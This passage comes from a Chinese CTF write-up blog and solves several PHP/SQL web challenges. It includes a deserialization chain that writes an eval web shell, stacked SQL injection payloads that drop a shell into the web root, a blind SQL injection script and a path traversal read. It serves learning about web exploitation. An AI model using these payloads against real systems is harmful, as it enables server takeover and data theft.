punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//这边$expire可控，直接非null</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//转int类型</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里会把内容变成$this->options['prefix'].$name</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//把如/var/www/html/index.php的字符串转为/var/www/html这样</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 创建失败</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//把传入的$value转为字符串</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//数据压缩，直接options['data_compress']=0绕过</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php\n//"</span> <span class="token operator">.</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n exit();?>\n"</span> <span class="token operator">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token comment">//这里需要绕过死亡exit</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这很明显写shell了</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写一下绕过死亡exit的方法，使用base64解码<code>&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n</code>这个字符串中真正会被base64解码识别到的内容实际上是<code>php12位长度的数字exit</code>而base64又是以4个字节为一组来进行解码的，所以我们data中的内容就是随便一个单字符加上一句话木马base64编码后的内容即可</p><p>最终构造出的链子就是触发A类销毁引导B类set函数执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//exp.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token comment">//文件的name</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span><span class="token comment">//无所谓其实</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xxx"</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["kkk"]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'base64_decode'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource='</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="WMCTF2020-Make-PHP-Great-Again"   >          <a href="#WMCTF2020-Make-PHP-Great-Again" class="heading-link"><i class="fas fa-link"></i></a><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2>      <p>PHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p>        <h2 id="极客大挑战-2020-Greatphp"   >          <a href="#极客大挑战-2020-Greatphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2>      <p>先扔一个exp</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;&#125;$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;$a&#x3D;new Error($str,1);$b&#x3D;new Error($str,2);$c &#x3D; new SYCLOVER();$c-&gt;syc &#x3D; $a;$c-&gt;lover &#x3D; $b;echo urlencode(serialize($c));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="SUCTF-2018-MultiSQL"   >          <a href="#SUCTF-2018-MultiSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2>      <p>注册登录，在头像处似乎有文件上传</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020934705.png"></p><p>上传后发现任何文件都被重命名为jpg格式</p><p>用户信息处有sql注入点，可使用堆叠注入</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020935563.png"></p><p>过滤了大量关键字，用设定语句变量绕过</p><pre class="line-numbers language-none"><code class="language-none">str&#x3D;&quot;select &#39;&lt;?php eval($_POST[kkk]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;len_str&#x3D;len(str)for i in range(0,len_str):if i &#x3D;&#x3D; 0:print(&#39;char(%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)else:print(&#39;,%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)print(&#39;)&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造写shell payload如下</p><pre class="line-numbers language-none"><code class="language-none">2;set @a&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,107,107,107,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @a;execute query;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>RCE拿flag</p>        <h2 id="SWPU2019-Web4"   >          <a href="#SWPU2019-Web4" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2>      <p>SQL注入，在username处放入单引号报错，但是再加上;就能执行，说明存在堆叠注入，先构造写shell语句发现无法写入，所以构造布尔注入语句</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> time<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span><span class="token punctuation">:</span>    by <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>strings<span class="token punctuation">,</span> <span class="token string">'UTF-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 先将输入的字符串转化成字节码</span>    hexstring <span class="token operator">=</span> by<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hexstringurl <span class="token operator">=</span> <span class="token string">"http://b28f3ae7-5844-4587-9d21-69687f9fc61d.node4.buuoj.cn:81/index.php?r=Login/Login"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    low <span class="token operator">=</span> <span class="token number">32</span>    high <span class="token operator">=</span> <span class="token number">128</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> low <span class="token operator">&lt;</span> high<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"select if(ascii(substr((select flag from flag),&#123;&#125;,1))>&#123;&#125;,sleep(2),0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        zpayload <span class="token operator">=</span> <span class="token string">"1';set @a=0x&#123;&#125;;prepare b from @a;execute b;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str_to_hex<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> zpayload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'111'</span>        <span class="token punctuation">&#125;</span>        datas <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        time1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>datas<span class="token punctuation">)</span>        time2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        times <span class="token operator">=</span> time2 <span class="token operator">-</span> time1        <span class="token keyword">if</span> times <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> high<span class="token punctuation">,</span> times<span class="token punctuation">)</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">if</span> mid <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑出一个文件名，下载查看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">///Common/fun.php</span><span class="token comment">// 路由控制跳转至控制器</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$controller</span><span class="token punctuation">&#125;</span></span>Controller"</span><span class="token punctuation">;</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"action<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$action</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"actionIndex"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"LoginController"</span><span class="token punctuation">;</span>        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"actionIndex"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location:index.php?r=Login/Index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">/Controller/BaseController<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//所有控制器的父类</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">BaseController</span><span class="token punctuation">&#123;</span><span class="token comment">/* * 加载视图文件 * viewName 视图名称 * viewData 视图分配数据*/</span><span class="token keyword">private</span> <span class="token variable">$viewPath</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">loadView</span><span class="token punctuation">(</span><span class="token variable">$viewName</span> <span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">viewPath</span> <span class="token operator">=</span> <span class="token constant">BASE_PATH</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/View/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$viewName</span><span class="token punctuation">&#125;</span></span>.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">viewPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$viewData</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将数组中的内容变为变量</span><span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">viewPath</span><span class="token punctuation">;</span><span class="token comment">//包含渲染模版</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">///View/userIndex<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$img_file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/../favicon.ico'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$img_dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span><span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="'</span> <span class="token operator">.</span> <span class="token variable">$img_base64</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">'</span><span class="token punctuation">;</span>       <span class="token comment">//任意文件base64编码</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计完payload就出来了</p><pre class="line-numbers language-none"><code class="language-none">?r&#x3D;User&#x2F;Index&amp;img_file&#x3D;&#x2F;..&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>图片处读base64解码即可</p>        <h2 id="GXYCTF2019-BabysqliV3-0"   >          <a href="#GXYCTF2019-BabysqliV3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2>      <p>我tm试了半天你告诉我弱口令？？？？？？？？？？？？？？？？？？？？？？？？/</p><p><code>admin/password</code><br><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206021103197.png"></p><p>明显的文件读取，伪协议读取</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//upload.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Uploader</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/uploads/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>                <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>                @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token 